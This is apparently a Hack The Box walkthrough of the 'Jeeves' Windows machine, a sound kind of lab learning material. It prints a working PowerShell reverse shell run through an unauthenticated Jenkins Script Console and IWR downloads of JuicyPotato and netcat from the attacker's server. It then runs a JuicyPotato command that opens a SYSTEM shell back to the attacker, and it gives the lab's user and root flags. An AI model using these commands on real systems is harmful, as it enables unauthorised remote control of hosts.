---
title: "Jeeves"
excerpt: "HTB: an unauthenticated Jenkins Script Console for RCE, then SeImpersonatePrivilege into SYSTEM with JuicyPotato, and a root flag hidden in an alternate data stream."
date: 2026-09-28
tag: htb
draft: false
---

| | |
|---|---|
| **Target** | `10.129.77.237` |
| **Host** | `JEEVES` |
| **OS** | Windows |
| **Chain** | Jenkins Script Console RCE → reverse shell as `kohsuke` → `SeImpersonatePrivilege` → JuicyPotato → SYSTEM → alternate data stream |

> Note:
> Remember, I am showing here only the final good path on how to do this box, dont be discouraged if your's doesnt look like this, because mine didnt. There was a lot of googling, searching, learning and taking wrong turns in between.

## Recon

First we run nmap:

```text
> nmap -sV -sC 10.129.77.237
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-28 06:38 -0400
Nmap scan report for 10.129.77.237
Host is up (0.035s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5h00m00s, deviation: 0s, median: 5h00m00s
| smb2-time: 
|   date: 2026-09-28T15:38:27
|_  start_date: 2026-09-28T15:37:08
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.17 seconds
```

### Finding Jenkins on port 50000

Port 80 is just an "Ask Jeeves" search page, but port 50000 running Jetty looks interesting, so we fuzz it:

```text
> ffuf -u http://jeeves.htb:50000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 40

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://jeeves.htb:50000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

askjeeves               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 70ms]
```

We open `/askjeeves` and see that it is Jenkins.

First thing let's check if we can access the `/script` path, so we try to open:

```text
http://jeeves.htb:50000/askjeeves/script
```

And boom, we can access it without any authentication, so let's get a reverse shell.

## Exploitation

### Reverse shell through the Script Console

Set up a listener:

```bash
nc -lvnp $PORT
```

In the Script Console type:

```powershell
def p = '''$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()};$client.Close()'''
Runtime.getRuntime().exec(["powershell.exe","-nop","-w","hidden","-c",p] as String[]).waitFor()
```

(change LHOST and LPORT)

### user.txt

And we get a reverse shell. We go to `C:\Users\kohsuke\Desktop` and surprisingly we get `user.txt`:

```text
PS C:\Users\kohsuke\Desktop> ls


    Directory: C:\Users\kohsuke\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/3/2017  11:22 PM             32 user.txt


PS C:\Users\kohsuke\Desktop> type user.txt
e3232272596fb47950d59c4cf1e7066a
```

`user.txt` : `e3232272596fb47950d59c4cf1e7066a`

## Privilege Escalation

### SeImpersonatePrivilege

Now let's type `whoami /all` and we instantly see `SeImpersonatePrivilege` enabled. That should already tell us to use tools from the Potato family.

```text
PS C:\Users\kohsuke\Desktop> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ===========================================
jeeves\kohsuke S-1-5-21-2851396806-8246019-2289784878-1001


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

### JuicyPotato to SYSTEM

So let's transport all the necessary tools.

On our attack host:

```bash
python3 -m http.server $PORT
```

On the target host:

```powershell
IWR http://YOUR_IP:PORT/JuicyPotato.exe -OutFile juicy.exe
IWR http://YOUR_IP:PORT/nc.exe -OutFile nc.exe
```

On the attack host:

```bash
nc -lvnp $PORT
```

On the target host let's use it:

```powershell
.\juicy.exe --% -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\kohsuke\AppData\Local\Temp\nc.exe YOUR_IP YOUR_PORT -e cmd.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

### root.txt in an alternate data stream

We get `SYSTEM` and we can get `root.txt`, or at least we thought so...

```text
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,581,688,320 bytes free

C:\Users\Administrator\Desktop>type hm.txt
The flag is elsewhere.  Look deeper.
```

Let's list files with alternate data streams then:

```text
C:\Users\Administrator\Desktop>dir /r
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,581,688,320 bytes free
```

We see `hm.txt:root.txt`, we need to open it using the `more` command:

```text
C:\Users\Administrator\Desktop>more < hm.txt:root.txt
afbc5bd4b615a60648cec41c6ac92530
```

And we get `root.txt`.

`root.txt` : `afbc5bd4b615a60648cec41c6ac92530`

GG.
